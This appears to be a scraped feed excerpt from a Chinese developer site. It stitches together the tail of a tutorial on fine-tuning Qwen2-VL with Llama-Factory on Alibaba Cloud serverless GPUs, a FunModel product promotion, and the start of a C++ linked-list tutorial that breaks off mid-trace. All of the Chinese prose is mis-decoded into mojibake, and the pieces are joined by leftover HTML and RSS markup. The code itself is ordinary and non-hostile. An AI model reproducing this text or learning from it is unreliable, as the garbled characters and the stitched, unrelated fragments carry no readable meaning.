<p><img src="https://intranetproxy.alipay.com/skylark/lark/0/2025/png/324184/1764920206458-2348ce56-3383-4031-98f3-72df874dcd98.png" alt="" loading="lazy"/></p>
<p>è¿™å°±æ˜¯ SFT çš„é­”åŠ›â€”â€”è®©é€šç”¨çš„å¤©æ‰å˜æˆå‚ç›´é¢†åŸŸçš„ä¸“å®¶ã€‚</p>
<p><strong>Step 3ï¼šæ¨¡å‹å¯¼å‡ºä¸è½åœ°</strong>
éªŒè¯æ»¡æ„åï¼Œç‚¹å‡» <strong>â€œExportâ€</strong> é¡µç­¾ã€‚</p>
<ul>
<li><strong>æœ€å¤§åˆ†å—å¤§å°</strong>ï¼š å»ºè®®è®¾ç½®ä¸º <code>2GB</code> æˆ– <code>4GB</code>ã€‚</li>
<li><strong>å¯¼å‡ºç›®å½•</strong>ï¼š æŒ‡å‘ä½ çš„ OSS è·¯å¾„æˆ–è€…æœ¬åœ°è·¯å¾„ã€‚ ç‚¹å‡»â€œå¼€å§‹å¯¼å‡ºâ€ï¼ŒLlama-Factory ä¼šè‡ªåŠ¨å°† LoRA æƒé‡ä¸åŸå§‹æ¨¡å‹åˆå¹¶ã€‚ç°åœ¨ï¼Œä½ æ‹¥æœ‰äº†ä¸€ä¸ªå®Œæ•´çš„ã€å¯ç›´æ¥éƒ¨ç½²åˆ°ç”Ÿäº§ç¯å¢ƒçš„ä¸“å± Qwen2-VL æ¨¡å‹ã€‚</li>
</ul>
<p><img src="https://intranetproxy.alipay.com/skylark/lark/0/2025/png/324184/1764920371970-d03c2468-f7a6-4833-9b3f-9bdb39ba79ed.png" alt="" loading="lazy"/></p>
<p><img src="https://intranetproxy.alipay.com/skylark/lark/0/2025/png/324184/1764920434175-366c54db-dead-4267-9a98-f9e2fc2afe39.png" alt="" loading="lazy"/></p>
<h3 data-id="heading-7">äº”ã€ç»“è¯­ï¼šServerless AIï¼Œè®©åˆ›æ–°è§¦æ‰‹å¯åŠ</h3>
<p>è‡³æ­¤ï¼Œæˆ‘ä»¬åªç”¨äº†ä¸€æ¯å’–å•¡çš„æ—¶é—´ï¼Œå°±å®Œæˆäº†ä»ç¯å¢ƒæ­å»ºã€æ¨¡å‹å¾®è°ƒåˆ°æ•ˆæœéªŒè¯çš„å…¨æµç¨‹ã€‚</p>
<p><strong>æœ€åï¼Œè®©æˆ‘ä»¬ç®—ä¸€ç¬”è´¦</strong>ï¼š å¦‚æœä½ ä¸ºäº†è¿™æ¬¡å®éªŒå»ç§Ÿèµä¸€å° L20 æœåŠ¡å™¨ï¼Œé€šå¸¸éœ€è¦æŒ‰æœˆä»˜è´¹ï¼Œæˆæœ¬å¯èƒ½é«˜è¾¾æ•°åƒå…ƒï¼Œä¸”å¤§éƒ¨åˆ†æ—¶é—´æ˜¾å¡éƒ½åœ¨ç©ºè½¬ã€‚ è€Œåœ¨é˜¿é‡Œäº‘å‡½æ•°è®¡ç®—ï¼ˆFCï¼‰ä¸Šï¼Œä½ åªéœ€è¦ä¸ºè®­ç»ƒçš„é‚£ <strong>2 å°æ—¶</strong> ä»˜è´¹ã€‚<strong>æŒ‰é‡ä»˜è´¹ï¼Œç”¨å®Œå³èµ°ï¼Œæˆæœ¬å¯èƒ½ä¸åˆ°ä¸€æ¯å¥¶èŒ¶é’±ã€‚</strong></p>
<p><strong>Serverless GPU çš„æ ¸å¿ƒä»·å€¼ï¼Œä¸ä»…ä»…æ˜¯çœé’±ï¼Œæ›´æ˜¯â€œè§£æ”¾â€ã€‚</strong> å®ƒæŠŠå¼€å‘è€…ä»ç¹ççš„è¿ç»´æ³¥æ½­ä¸­è§£æ”¾å‡ºæ¥ï¼Œä¸å†éœ€è¦æ‹…å¿ƒ CUDA ç‰ˆæœ¬ã€æ˜¾å­˜æº¢å‡ºæˆ–èµ„æºé—²ç½®ã€‚ä½ åªéœ€è¦å…³æ³¨æœ€æ ¸å¿ƒçš„èµ„äº§â€”â€”<strong>æ•°æ®</strong>ä¸<strong>åˆ›æ„</strong>ã€‚</p>
<p>å¤šæ¨¡æ€çš„æ—¶ä»£å·²ç»åˆ°æ¥ï¼ŒQwen2-VL çš„å¤§é—¨å·²ç»æ•å¼€ã€‚ ç°åœ¨ï¼Œè½®åˆ°ä½ äº†ã€‚</p>
<h2 data-id="heading-8">äº†è§£å‡½æ•°è®¡ç®—æ¨¡å‹æœåŠ¡ FunModel</h2>
<p>FunModel æ˜¯ä¸€ä¸ªé¢å‘ AI æ¨¡å‹å¼€å‘ã€éƒ¨ç½²ä¸è¿ç»´çš„å…¨ç”Ÿå‘½å‘¨æœŸç®¡ç†å¹³å°ã€‚æ‚¨åªéœ€æä¾›æ¨¡å‹æ–‡ä»¶ï¼ˆä¾‹å¦‚æ¥è‡ª ModelScopeã€Hugging Face ç­‰ç¤¾åŒºçš„æ¨¡å‹ä»“åº“ï¼‰ï¼Œå³å¯åˆ©ç”¨ FunModel çš„è‡ªåŠ¨åŒ–å·¥å…·å¿«é€Ÿå®Œæˆæ¨¡å‹æœåŠ¡çš„å°è£…ä¸éƒ¨ç½²ï¼Œå¹¶è·å¾—å¯ç›´æ¥è°ƒç”¨çš„æ¨ç† APIã€‚å¹³å°åœ¨è®¾è®¡ä¸Šæ—¨åœ¨æå‡èµ„æºä½¿ç”¨æ•ˆç‡å¹¶ç®€åŒ–å¼€å‘éƒ¨ç½²æµç¨‹ã€‚</p>
<p>FunModel ä¾æ‰˜ Serverless + GPUï¼Œå¤©ç„¶æä¾›äº†ç®€å•ï¼Œè½»é‡ï¼Œ0 é—¨æ§›çš„æ¨¡å‹é›†æˆæ–¹æ¡ˆï¼Œç»™ä¸ªäººå¼€å‘è€…è‰¯å¥½çš„ç©è½¬æ¨¡å‹çš„ä½“éªŒï¼Œä¹Ÿè®©ä¼ä¸šçº§å¼€å‘è€…å¿«é€Ÿé«˜æ•ˆçš„éƒ¨ç½²ã€è¿ç»´å’Œè¿­ä»£æ¨¡å‹ã€‚</p>
<p>åœ¨é˜¿é‡Œäº‘ FunModel å¹³å°ï¼Œå¼€å‘è€…å¯ä»¥åšåˆ°ï¼š</p>
<ul>
<li><strong>æ¨¡å‹çš„å¿«é€Ÿéƒ¨ç½²ä¸Šçº¿</strong>ï¼šä»åŸæ¥çš„ä»¥å‘¨ä¸ºå•ä½çš„æ¨¡å‹æ¥å…¥å‘¨æœŸé™ä½åˆ° 5 åˆ†é’Ÿï¼Œ0 å¼€å‘ï¼Œæ— æ’æœŸ</li>
<li><strong>ä¸€é”®æ‰©ç¼©å®¹ï¼Œè®©è¿ç»´ä¸å†æ˜¯è´Ÿæ‹…</strong>ï¼šå¤šç§æ‰©ç¼©å®¹ç­–ç•¥é«˜åº¦é€‚é…ä¸šåŠ¡æµé‡ï¼Œå®ç°â€œæ— ç—›è¿ç»´â€</li>
</ul>
<p><strong>æŠ€æœ¯ä¼˜åŠ¿</strong></p>






























<table><thead><tr><th align="left">ç‰¹æ€§</th><th align="left">FunModel å®ç°æœºåˆ¶</th><th align="left">è¯´æ˜</th></tr></thead><tbody><tr><td align="left">èµ„æºåˆ©ç”¨ç‡</td><td align="left">é‡‡ç”¨ GPU è™šæ‹ŸåŒ–ä¸èµ„æºæ± åŒ–æŠ€æœ¯ã€‚</td><td align="left">è¯¥è®¾è®¡å…è®¸å¤šä¸ªä»»åŠ¡å…±äº«åº•å±‚ç¡¬ä»¶èµ„æºï¼Œæ—¨åœ¨æé«˜è®¡ç®—èµ„æºçš„æ•´ä½“ä½¿ç”¨æ•ˆç‡ã€‚</td></tr><tr><td align="left">å®ä¾‹å°±ç»ªæ—¶é—´</td><td align="left">åŸºäºå¿«ç…§æŠ€æœ¯çš„çŠ¶æ€æ¢å¤æœºåˆ¶ã€‚</td><td align="left">å®ä¾‹å¯åŠ¨æ—¶ï¼Œå¯é€šè¿‡å¿«ç…§åœ¨æ¯«ç§’çº§åˆ«æ¢å¤è¿è¡ŒçŠ¶æ€ï¼Œä»è€Œå°†å®ä¾‹ä»åˆ›å»ºåˆ°å°±ç»ªçš„æ—¶é—´æ§åˆ¶åœ¨ç§’çº§ã€‚</td></tr><tr><td align="left">å¼¹æ€§æ‰©å®¹å“åº”</td><td align="left">ç»“åˆé¢„çƒ­èµ„æºæ± ä¸å¿«é€Ÿå®ä¾‹æ¢å¤èƒ½åŠ›ã€‚</td><td align="left">å½“è´Ÿè½½å¢åŠ æ—¶ï¼Œç³»ç»Ÿå¯ä»¥ä»é¢„çƒ­èµ„æºæ± ä¸­å¿«é€Ÿè°ƒåº¦å¹¶å¯åŠ¨æ–°å®ä¾‹ï¼Œå®ç°ç§’çº§çš„æ°´å¹³æ‰©å±•å“åº”ã€‚</td></tr><tr><td align="left">è‡ªåŠ¨åŒ–éƒ¨ç½²è€—æ—¶</td><td align="left">æä¾›å¯ä¸€é”®è§¦å‘çš„æ„å»ºä¸éƒ¨ç½²æµç¨‹ã€‚</td><td align="left">ä¸€æ¬¡æ ‡å‡†çš„éƒ¨ç½²æµç¨‹ï¼ˆä»ä»£ç æäº¤åˆ°æœåŠ¡ä¸Šçº¿ï¼‰é€šå¸¸å¯åœ¨ 10 åˆ†é’Ÿå†…å®Œæˆã€‚</td></tr></tbody></table>
<h3 data-id="heading-9">æ›´å¤šå†…å®¹è¯·å‚è€ƒ</h3>
<ol>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fhelp.aliyun.com%2Fzh%2Ffunctioncompute%2Ffc%2Fmodel-service-funmodel%2F" target="_blank" title="https://help.aliyun.com/zh/functioncompute/fc/model-service-funmodel/" ref="nofollow noopener noreferrer">æ¨¡å‹æœåŠ¡FunModel äº§å“æ–‡æ¡£</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fhelp.aliyun.com%2Fzh%2Ffunctioncompute%2Ffc%2Fquick-start" target="_blank" title="https://help.aliyun.com/zh/functioncompute/fc/quick-start" ref="nofollow noopener noreferrer">FunModelå¿«é€Ÿå…¥é—¨</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fhelp.aliyun.com%2Fzh%2Ffunctioncompute%2Ffc%2Fcustom-model-deployment" target="_blank" title="https://help.aliyun.com/zh/functioncompute/fc/custom-model-deployment" ref="nofollow noopener noreferrer">FunModel è‡ªå®šä¹‰éƒ¨ç½²</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Ffcnext.console.aliyun.com%2Ffun-model%2Fcn-hangzhou%2Ffun-model%2Fmodel-market" target="_blank" title="https://fcnext.console.aliyun.com/fun-model/cn-hangzhou/fun-model/model-market" ref="nofollow noopener noreferrer">FunModel æ¨¡å‹å¹¿åœº</a></li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å•é“¾è¡¨ä¸åŒé“¾è¡¨ä¸“é¢˜è¯¦è§£]]></title>    <link>https://juejin.cn/post/7581689310643060778</link>    <guid>https://juejin.cn/post/7581689310643060778</guid>    <pubDate>2025-12-09T10:19:33.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581689310643060778" data-draft-id="7581676787379666963" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å•é“¾è¡¨ä¸åŒé“¾è¡¨ä¸“é¢˜è¯¦è§£"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2025-12-09T10:19:33.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç äº‹æ¼«è°ˆ"/> <meta itemprop="url" content="https://juejin.cn/user/1972974802965230"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å•é“¾è¡¨ä¸åŒé“¾è¡¨ä¸“é¢˜è¯¦è§£
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1972974802965230/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç äº‹æ¼«è°ˆ
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-09T10:19:33.000Z" title="Tue Dec 09 2025 10:19:33 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»11åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>é“¾è¡¨æ˜¯<strong>çº¿æ€§æ•°æ®ç»“æ„</strong>ï¼Œä½†ä¸æ•°ç»„æœ‰æœ¬è´¨åŒºåˆ«ã€‚æ•°ç»„æ˜¯è¿ç»­çš„å†…å­˜ç©ºé—´ï¼Œæ”¯æŒéšæœºè®¿é—®ï¼›é“¾è¡¨åˆ™æ˜¯<strong>ç¦»æ•£çš„å†…å­˜èŠ‚ç‚¹é€šè¿‡æŒ‡é’ˆè¿æ¥</strong>ï¼Œåªæ”¯æŒé¡ºåºè®¿é—®ã€‚ç†è§£é“¾è¡¨çš„æ ¸å¿ƒåœ¨äºæŒæ¡<strong>æŒ‡é’ˆæ“ä½œ</strong>å’Œ<strong>èŠ‚ç‚¹å…³ç³»ç®¡ç†</strong>ã€‚</p>
<h2 data-id="heading-0">ä¸€ã€å•é“¾è¡¨åŸºç¡€ï¼šèŠ‚ç‚¹ç»“æ„ä¸åˆ›å»º</h2>
<h3 data-id="heading-1">1.1 å•é“¾è¡¨èŠ‚ç‚¹ç»“æ„</h3>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">ListNode</span> {
    <span class="hljs-type">int</span> val;         <span class="hljs-comment">// èŠ‚ç‚¹å€¼</span>
    ListNode* next;  <span class="hljs-comment">// æŒ‡å‘ä¸‹ä¸€ä¸ªèŠ‚ç‚¹çš„æŒ‡é’ˆ</span>
    
    <span class="hljs-built_in">ListNode</span>(<span class="hljs-type">int</span> x) : <span class="hljs-built_in">val</span>(x), <span class="hljs-built_in">next</span>(<span class="hljs-literal">nullptr</span>) {}
};
</code></pre>
<p><strong>å…³é”®ç†è§£</strong>ï¼š</p>
<ul>
<li>æ¯ä¸ªèŠ‚ç‚¹åŒ…å«ä¸¤éƒ¨åˆ†ï¼šæ•°æ®åŸŸ(val)å’ŒæŒ‡é’ˆåŸŸ(next)</li>
<li><code>next</code>æŒ‡é’ˆæŒ‡å‘ä¸‹ä¸€ä¸ªèŠ‚ç‚¹ï¼Œå½¢æˆé“¾å¼ç»“æ„</li>
<li>æœ€åä¸€ä¸ªèŠ‚ç‚¹çš„<code>next</code>æŒ‡å‘<code>nullptr</code>ï¼Œè¡¨ç¤ºé“¾è¡¨ç»“æŸ</li>
</ul>
<h3 data-id="heading-2">1.2 åˆ›å»ºé“¾è¡¨çš„ä¸‰ç§æ–¹æ³•</h3>
<h4 data-id="heading-3">æ–¹æ³•ä¸€ï¼šæ‰‹åŠ¨è¿æ¥</h4>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-comment">// åˆ›å»ºä¸‰ä¸ªèŠ‚ç‚¹</span>
ListNode* node1 = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ListNode</span>(<span class="hljs-number">1</span>);
ListNode* node2 = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ListNode</span>(<span class="hljs-number">2</span>);
ListNode* node3 = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ListNode</span>(<span class="hljs-number">3</span>);

<span class="hljs-comment">// æ‰‹åŠ¨è¿æ¥</span>
node1-&gt;next = node2;
node2-&gt;next = node3;
<span class="hljs-comment">// node3-&gt;next ä¿æŒä¸º nullptr</span>
</code></pre>
<h4 data-id="heading-4">æ–¹æ³•äºŒï¼šå°¾æ’æ³•ï¼ˆæœ€å¸¸ç”¨ï¼‰</h4>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-function">ListNode* <span class="hljs-title">createList</span><span class="hljs-params">(<span class="hljs-type">const</span> vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums)</span> </span>{
    <span class="hljs-function">ListNode <span class="hljs-title">dummy</span><span class="hljs-params">(<span class="hljs-number">0</span>)</span></span>;  <span class="hljs-comment">// å“‘èŠ‚ç‚¹ï¼Œç®€åŒ–è¾¹ç•Œå¤„ç†</span>
    ListNode* tail = &amp;dummy;  <span class="hljs-comment">// å°¾æŒ‡é’ˆï¼Œå§‹ç»ˆæŒ‡å‘æœ€åä¸€ä¸ªèŠ‚ç‚¹</span>
    
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> num : nums) {
        tail-&gt;next = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ListNode</span>(num);
        tail = tail-&gt;next;  <span class="hljs-comment">// ç§»åŠ¨å°¾æŒ‡é’ˆ</span>
    }
    
    <span class="hljs-keyword">return</span> dummy.next;  <span class="hljs-comment">// è¿”å›çœŸæ­£çš„å¤´èŠ‚ç‚¹</span>
}
</code></pre>
<p><strong>å“‘èŠ‚ç‚¹æŠ€å·§</strong>ï¼š</p>
<ul>
<li>é¿å…å¤„ç†å¤´èŠ‚ç‚¹çš„ç‰¹æ®Šæƒ…å†µ</li>
<li>ä»£ç æ›´ç®€æ´ï¼Œé€»è¾‘æ›´æ¸…æ™°</li>
<li>å¸¸ç”¨åœ¨é“¾è¡¨æ“ä½œä¸­</li>
</ul>
<h4 data-id="heading-5">æ–¹æ³•ä¸‰ï¼šå¤´æ’æ³•ï¼ˆåˆ›å»ºé€†åºé“¾è¡¨ï¼‰</h4>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-function">ListNode* <span class="hljs-title">createReverseList</span><span class="hljs-params">(<span class="hljs-type">const</span> vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums)</span> </span>{
    ListNode* head = <span class="hljs-literal">nullptr</span>;
    
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> num : nums) {
        ListNode* newNode = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ListNode</span>(num);
        newNode-&gt;next = head;  <span class="hljs-comment">// æ–°èŠ‚ç‚¹æŒ‡å‘åŸå¤´èŠ‚ç‚¹</span>
        head = newNode;        <span class="hljs-comment">// æ›´æ–°å¤´èŠ‚ç‚¹</span>
    }
    
    <span class="hljs-keyword">return</span> head;
}
</code></pre>
<h3 data-id="heading-6">1.3 éå†é“¾è¡¨</h3>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">printList</span><span class="hljs-params">(ListNode* head)</span> </span>{
    ListNode* curr = head;
    
    <span class="hljs-keyword">while</span> (curr) {
        cout &lt;&lt; curr-&gt;val;
        <span class="hljs-keyword">if</span> (curr-&gt;next) cout &lt;&lt; <span class="hljs-string">" -&gt; "</span>;
        curr = curr-&gt;next;
    }
    cout &lt;&lt; <span class="hljs-string">" -&gt; nullptr"</span> &lt;&lt; endl;
}
</code></pre>
<h2 data-id="heading-7">äºŒã€å•é“¾è¡¨æ ¸å¿ƒæ“ä½œï¼šåè½¬ç®—æ³•è¯¦è§£</h2>
<h3 data-id="heading-8">2.1 é—®é¢˜åˆ†æï¼šä¸ºä»€ä¹ˆè¦åè½¬é“¾è¡¨ï¼Ÿ</h3>
<p>é“¾è¡¨åè½¬æ˜¯<strong>æœ€ç»å…¸çš„é“¾è¡¨é—®é¢˜</strong>ï¼Œè€ƒå¯Ÿå¯¹æŒ‡é’ˆæ“ä½œçš„ç†è§£ã€‚åè½¬æ„å‘³ç€æ”¹å˜èŠ‚ç‚¹é—´çš„æŒ‡å‘å…³ç³»ï¼Œå°†<code>a-&gt;b-&gt;c</code>å˜ä¸º<code>a&lt;-b&lt;-c</code>ã€‚</p>
<h3 data-id="heading-9">2.2 è¿­ä»£åè½¬æ³•ï¼ˆä¸‰æŒ‡é’ˆæ³•ï¼‰</h3>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-function">ListNode* <span class="hljs-title">reverseIterative</span><span class="hljs-params">(ListNode* head)</span> </span>{
    ListNode* prev = <span class="hljs-literal">nullptr</span>;   <span class="hljs-comment">// å‰ä¸€ä¸ªèŠ‚ç‚¹ï¼Œåˆå§‹ä¸ºnullptr</span>
    ListNode* curr = head;      <span class="hljs-comment">// å½“å‰èŠ‚ç‚¹ï¼Œä»å¤´èŠ‚ç‚¹å¼€å§‹</span>
    ListNode* next = <span class="hljs-literal">nullptr</span>;   <span class="hljs-comment">// ä¸‹ä¸€ä¸ªèŠ‚ç‚¹ï¼Œä¸´æ—¶ä¿å­˜</span>
    
    <span class="hljs-keyword">while</span> (curr) {
        <span class="hljs-comment">// æ­¥éª¤1ï¼šä¿å­˜ä¸‹ä¸€ä¸ªèŠ‚ç‚¹ï¼ˆå…³é”®ï¼ï¼‰</span>
        next = curr-&gt;next;
        
        <span class="hljs-comment">// æ­¥éª¤2ï¼šåè½¬å½“å‰èŠ‚ç‚¹çš„æŒ‡é’ˆ</span>
        curr-&gt;next = prev;
        
        <span class="hljs-comment">// æ­¥éª¤3ï¼šç§»åŠ¨æŒ‡é’ˆï¼Œå‡†å¤‡ä¸‹ä¸€æ¬¡å¾ªç¯</span>
        prev = curr;  <span class="hljs-comment">// prevç§»åŠ¨åˆ°å½“å‰èŠ‚ç‚¹</span>
        curr = next;  <span class="hljs-comment">// currç§»åŠ¨åˆ°ä¸‹ä¸€ä¸ªèŠ‚ç‚¹</span>
    }
    
    <span class="hljs-keyword">return</span> prev;  <span class="hljs-comment">// å¾ªç¯ç»“æŸæ—¶ï¼ŒprevæŒ‡å‘åŸé“¾è¡¨çš„å°¾èŠ‚ç‚¹ï¼Œå³æ–°é“¾è¡¨çš„å¤´èŠ‚ç‚¹</span>
}
</code></pre>
<h4 data-id="heading-10">é€æ­¥åˆ†æï¼ˆé“¾è¡¨ï¼š1-&gt;2-&gt;3-&gt;nullptrï¼‰</h4>
<pre><code class="hljs language-ini" lang="ini">åˆå§‹çŠ¶æ€ï¼š
<span class="hljs-attr">prev</span> = nullptr
<span class="hljs-attr">curr</span> = <span class="hljs-number">1</span>
<span class="hljs-attr">next</span> = nullptr

ç¬¬1æ¬¡å¾ªç¯ï¼š
<span class="hljs-attr">next</span> = curr-&gt;next = <span class="hljs-number">2</span>        // ä¿å­˜èŠ‚ç‚¹<span class="hljs-number">2</span>
curr-&gt;<span class="hljs-attr">next</span> = prev = nullptr  // <span class="hljs-number">1</span>-&gt;nullptr
<span class="hljs-attr">prev</span> = curr = <span class="hljs-number">1</span>              // prevæŒ‡å‘<span class="hljs-number">1</span>
<span class="hljs-attr">curr</span> = next = <span class="hljs-number">2</span>              // curræŒ‡å‘<span class="hljs-number">2</span>
ç»“æœï¼šnullptr &lt;- 1   2-&gt;3-&gt;nullptr

ç¬¬2æ¬¡å¾ªç¯ï¼š
<span class="hljs-attr">next</span> = curr-&gt;next = <span class="hljs-number">3</span>        // ä¿å­˜èŠ‚ç‚¹<span class="hljs-number">3</span>
curr-&gt;<span class="hljs-attr">next</span> = prev = <span class="hljs-number">1</span>        // <span class="hljs-number">2</span>-&gt;<span class="hljs-number">1</span>
<span class="hljs-attr">prev</span> = curr = <span class="hljs-number">2</span>              // prevæŒ‡å‘<span class="hljs-number">2</span>
<span class="hljs-attr">curr</span> = next = <span class="hljs-number">3</span>              // curræŒ‡å‘<span class="hljs-number">3</span>
ç»“æœï¼šnullptr &lt;- 1 &lt;- 2   3-&gt;nullptr

ç¬¬3æ¬¡å¾ªç¯ï¼š
<span class="hljs-attr">next</span> = curr-&gt;next = nullptr  // ä¿å­˜nullptr
curr-&gt;<span class="hljs-attr">next</span> = prev = <span class="hljs-number">2</span>        // <span class="hljs-number">3</span>-&gt;<span class="hljs-number">2</span>
<span class="hljs-attr">prev</span> = curr = <span class="hljs-number">3</span>              // prevæŒ‡å‘<span class="hljs-number">3</span>
<span class="hljs-attr">curr</span> = next = nullptr        // curræŒ‡å‘nullptrï¼Œå¾ªç¯ç»“æŸ
